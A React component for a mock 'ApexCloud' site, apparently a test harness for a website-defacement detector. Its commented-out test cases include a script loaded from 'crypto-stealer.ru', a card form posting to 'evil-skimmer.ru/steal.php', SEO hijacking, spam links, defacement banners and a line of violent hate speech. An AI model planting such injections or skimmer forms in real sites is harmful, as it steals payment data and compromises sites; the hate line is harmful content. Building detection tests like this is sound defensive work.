import React, { useEffect } from "react";

/**
 * 🛡️ Main Content Component (Matching Target Screenshot UI)
 * Implements `.main-content`, `.banner`, `.content-card-container`, `.content-card`,
 * and dynamic DOM manipulation hooks for L1 structural defacement detection.
 */
const MainContent = () => {
  // =========================================================================
  // 🔬 DYNAMIC DOM HEAD MANIPULATION (L1 & L4 META / SCRIPT TEST CASES)
  // =========================================================================
  useEffect(() => {
    /* [UNCOMMENT TO TEST L1-TRG-05] Canonical Link SEO Poisoning */
    /*
    const canonical = document.createElement("link");
    canonical.rel = "canonical";
    canonical.href = "https://spam-seo-hijack.org";
    canonical.id = "test-canonical";
    document.head.appendChild(canonical);
    */

    /* [UNCOMMENT TO TEST L1-TRG-06] Robots De-indexing Sabotage */
    /*
    const robots = document.createElement("meta");
    robots.name = "robots";
    robots.content = "noindex, nofollow";
    robots.id = "test-robots";
    document.head.appendChild(robots);
    */

    /* [UNCOMMENT TO TEST L1-TRG-03] Malicious External JS Injection */
    /*
    const script = document.createElement("script");
    script.src = "https://crypto-stealer.ru/app.js";
    script.async = true;
    script.id = "test-script";
    document.head.appendChild(script);
    */

    /* [UNCOMMENT TO TEST L4-ADV-02] JS Hidden Manifesto / Slogans */
    /*
    const inlineScript = document.createElement("script");
    inlineScript.id = "test-inline-script";
    inlineScript.innerHTML = `
      // CyberShield PRO Test: Hidden JS Payload
      console.log("you have been hacked by anonymous cyber team. 0wned by legion.");
    `;
    document.head.appendChild(inlineScript);
    */

    return () => {
      const can = document.getElementById("test-canonical");
      if (can) document.head.removeChild(can);
      const rob = document.getElementById("test-robots");
      if (rob) document.head.removeChild(rob);
      const scr = document.getElementById("test-script");
      if (scr) document.head.removeChild(scr);
      const inl = document.getElementById("test-inline-script");
      if (inl) document.head.removeChild(inl);
    };
  }, []);

  return (
    <div className="main-content">
      {/* 1. Header Banner */}
      <div className="banner">
        <div className="banner-title">
          <div className="w-10 h-10 rounded-2xl bg-white/10 flex items-center justify-center font-bold mr-4 text-emerald-400 shadow-lg border border-white/20">
            🛡️
          </div>
          <span>ApexCloud Secure Backbone</span>
        </div>
        <div className="banner-subtitle">
          Next-Generation Cloud Architecture Guarded by Real-Time Tier-1 Structural & Semantic AI Sensors
        </div>
      </div>

      {/* 2. Content Card Container */}
      <div className="content-card-container">
        <div className="content-card">
          <div className="content-card-header">
            <span className="text-3xl mr-3">⚡</span>
            <h2>Enterprise Workload Infrastructure</h2>
          </div>
          <p className="content-card-desc">
            Deploy secure container clusters, enterprise databases, and high-velocity microservices with military-grade zero-trust isolation and automated tamper-evident sealing.
          </p>

          {/* Featured Architecture Image */}
          <img 
            src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2000&auto=format&fit=crop" 
            alt="Infrastructure Architecture" 
            className="card-image mb-10 shadow-xl" 
          />

          {/* =====================================================================
            * 🚨 LAYER 1 & LAYER 4 DEFACEMENT TEST SUITE (DOM BODY MOCKS)
            * ===================================================================== */}

          {/* [UNCOMMENT TO TEST L1-TRG-01] Payment Form Hijacking (Cross-Apex) */}
          {/*
          <div className="my-8 p-6 bg-red-50 border-2 border-red-400 rounded-2xl">
            <h3 className="text-lg font-bold text-red-700 mb-2">⚠️ L1 Test Case 1: Cross-Apex Form Action Hijack</h3>
            <form action="https://evil-skimmer.ru/steal.php" method="POST">
              <input type="text" name="cc_num" placeholder="Card Number" className="p-2.5 text-black bg-white border border-red-300 rounded-xl mb-3 w-full" />
              <button type="submit" className="bg-red-600 hover:bg-red-700 text-white px-5 py-2.5 rounded-xl font-bold shadow-md transition-all">Submit Secure Payment</button>
            </form>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L1-TRG-02] Payment Form HTTP Downgrade */}
          {/*
          <div className="my-8 p-6 bg-amber-50 border-2 border-amber-400 rounded-2xl">
            <h3 className="text-lg font-bold text-amber-700 mb-2">⚠️ L1 Test Case 2: Insecure HTTP Scheme Downgrade</h3>
            <form action="http://apexcloud.com/checkout/process" method="POST">
              <input type="text" name="data" placeholder="Secure Info" className="p-2.5 text-black bg-white border border-amber-300 rounded-xl mb-3 w-full" />
              <button type="submit" className="bg-amber-600 hover:bg-amber-700 text-white px-5 py-2.5 rounded-xl font-bold shadow-md transition-all">Process Secure Order</button>
            </form>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TAX-02] Hacktivist Defacement (English) */}
          {/*
          <div className="my-8 p-12 bg-slate-950 border-4 border-emerald-500 text-center font-mono rounded-2xl shadow-2xl">
            <h1 className="text-4xl font-black text-emerald-400 animate-pulse mb-3">HACKED BY ANONYMOUS CYBER TEAM</h1>
            <p className="text-xl text-emerald-300 mb-3">0wned by Legion. Your security is a joke. We are anonymous, expect us.</p>
            <p className="text-sm text-slate-400">Greetz to all cyber warriors. You have been hacked!</p>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TAX-03 & 04] Multilingual Hacktivist (Hindi / Bengali) */}
          {/*
          <div className="my-8 p-8 bg-red-950/90 border-2 border-red-500 rounded-2xl text-center text-white">
            <h2 className="text-3xl font-extrabold text-red-400 mb-3">⚠️ हैक किया गया | হ্যাক করা হয়েছে</h2>
            <p className="text-lg text-slate-200 mb-2">साइट हैक कर ली गई है। आपकी सुरक्षा प्रणाली बेहद कमजोर है।</p>
            <p className="text-lg text-slate-300">আপনার নিরাপত্তা দুর্বল। আমরা আপনাকে দেখছি।</p>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TRG-01] Tier-1 Manifesto Defacement Attack */}
          {/*
          <div className="my-8 p-8 bg-purple-950 text-white border-l-8 border-purple-500 rounded-2xl shadow-xl">
            <h2 className="text-2xl font-bold text-purple-300 mb-3">OFFICIAL SEIZURE NOTICE & MANIFESTO</h2>
            <p className="text-base text-purple-100 leading-relaxed">
              We have taken control. This site has been seized by the cyber liberation front. 
              Message to the world: your security means nothing against our collective will. 
              Government corruption and corporate greed will no longer remain unanswered. Operation liberated is now fully active.
            </p>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TAX-06] SEO Pharma / Casino Spam */}
          {/*
          <div className="my-8 p-8 bg-blue-950 text-white border-2 border-blue-400 rounded-2xl">
            <h3 className="text-xl font-bold text-blue-300 mb-3">💊 L4 Test Case: SEO Black-Hat Spam</h3>
            <p className="text-blue-100 mb-3 text-sm">
              Looking for genuine medical products? Buy cheap viagra online today without prescription pills. 
              Secure fast delivery. Double your bitcoin with our premium crypto trading bot and betting bonus online casino games.
            </p>
            <div className="flex flex-wrap gap-4 text-blue-300 underline font-semibold text-xs">
              <a href="http://spam-casino.com">Online Casino</a>
              <a href="http://pills-store.com">Cheap Pills</a>
              <a href="http://crypto-scam.net">Double BTC</a>
              <a href="http://viagra-buy.org">Buy Now</a>
            </div>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TAX-07] Hate Speech / Offensive Content */}
          {/*
          <div className="my-8 p-6 bg-red-900 border-2 border-red-500 rounded-2xl text-white font-bold text-center">
            <h3 className="text-xl mb-1 text-red-200">🛑 L4 Test Case: Hate Speech</h3>
            <p className="text-base">Death to all infidel scum. Racial cleansing must begin immediately. Nuke the entire continent.</p>
          </div>
          */}

          {/* [UNCOMMENT TO TEST L4-TAX-08] Bot Parking / Template Placeholder */}
          {/*
          <div className="my-8 p-6 bg-slate-900 border-2 border-slate-700 rounded-2xl text-white text-center">
            <h3 className="text-xl font-bold text-amber-400 mb-1">Under Construction</h3>
            <p className="text-slate-300 text-sm">Site is temporarily unavailable. Coming soon. Please check back later. Lorem ipsum dolor sit amet.</p>
          </div>
          */}

          {/* Legitimate Checkout Form Baseline Mock */}
          <div className="mt-12 pt-10 border-t border-slate-200">
            <div className="flex items-center justify-between mb-6">
              <div>
                <span className="text-xs font-bold uppercase tracking-wider px-3 py-1 bg-emerald-100 text-emerald-800 rounded-full mb-2 inline-block font-mono">Enterprise Baseline Target</span>
                <h3 className="text-2xl font-extrabold text-slate-900">Secure Cloud Checkout</h3>
              </div>
              <div className="text-right">
                <span className="text-3xl font-black text-slate-900">$499</span>
                <span className="text-slate-500 text-xs"> / month</span>
              </div>
            </div>

            {/* Verified Form Action Baseline */}
            <form action="https://apexcloud.com/checkout/process" method="POST" className="space-y-4 bg-slate-50 p-6 rounded-2xl border border-slate-200">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 uppercase mb-1">Company Name</label>
                  <input type="text" placeholder="Acme Corp" className="w-full bg-white border border-slate-300 rounded-xl px-4 py-2.5 text-sm text-slate-900 focus:border-indigo-500 focus:outline-none shadow-sm" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-700 uppercase mb-1">Billing Email</label>
                  <input type="email" placeholder="billing@acme.com" className="w-full bg-white border border-slate-300 rounded-xl px-4 py-2.5 text-sm text-slate-900 focus:border-indigo-500 focus:outline-none shadow-sm" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 uppercase mb-1">Secure Card Details</label>
                <div className="flex bg-white border border-slate-300 rounded-xl px-4 py-2.5 items-center text-sm shadow-sm font-mono">
                  <span className="text-slate-500 mr-3">💳</span>
                  <input type="text" placeholder="•••• •••• •••• 4242" className="w-full bg-transparent text-slate-900 focus:outline-none" />
                  <span className="text-xs text-slate-400">MM/YY CVC</span>
                </div>
              </div>

              <button type="submit" className="w-full py-3.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 font-bold text-white text-sm shadow-lg shadow-blue-600/30 hover:opacity-95 transition-all mt-2">
                Confirm Verified Payment
              </button>
              <p className="text-center text-xs text-slate-500 mt-2 font-medium">🔒 256-Bit TLS Encryption & Verified Target Domain.</p>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MainContent;
